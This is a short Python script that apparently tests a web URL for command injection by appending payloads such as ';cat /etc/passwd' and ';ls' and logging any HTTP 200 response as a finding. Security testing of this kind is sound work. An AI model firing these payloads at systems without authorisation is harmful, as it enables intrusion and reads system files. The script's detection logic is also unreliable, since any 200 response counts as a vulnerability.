import sys
import logging
import requests
import argparse

parser = argparse.ArgumentParser(description="Configure proxy")
parser.add_argument(
    "--url",
    type=str,
    help="url of the target",
)
parser.add_argument(
    "--proxy",
    type=str,
    help="IP and Port of proxy",
)
args = parser.parse_args()
logging.debug(args.url, args.proxy)
logging.basicConfig(filename="/RESULTS/command_injection.log", level=logging.DEBUG)

# Setting variables
url = args.url
payloads = [";ls", ";cat /etc/passwd", ";pwd", ";dir"]

# Testing for command injection
logging.info("Starting command injection test for: {}".format(url))
for payload in payloads:
    try:
        if args.proxy:
            logging.debug("using proxy %s", args.proxy)
            r = requests.get(
                url + payload,
                verify=False,
                proxies={"http": args.proxy, "https": args.proxy},
            )
        else:
            r = requests.get(url + payload, verify=False)
        if r.status_code == 200:
            logging.warning("Command injection vulnerability detected!")
            logging.warning("Payload used: {}".format(payload))
            sys.exit(1)
        else:
            logging.info("No command injection vulnerabilities detected!")
    except Exception as e:
        logging.error("An error occurred: {}".format(e))
        sys.exit(1)
